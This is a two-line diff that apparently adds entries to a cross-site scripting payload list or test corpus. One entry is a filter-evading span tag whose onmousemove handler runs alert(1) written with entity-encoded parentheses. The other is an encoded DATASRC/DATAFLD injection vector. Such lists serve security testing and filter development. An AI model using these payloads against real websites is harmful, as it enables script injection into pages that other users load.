@@ -1,0 +1,2 @@
+<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
+&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/SPAN&gt;
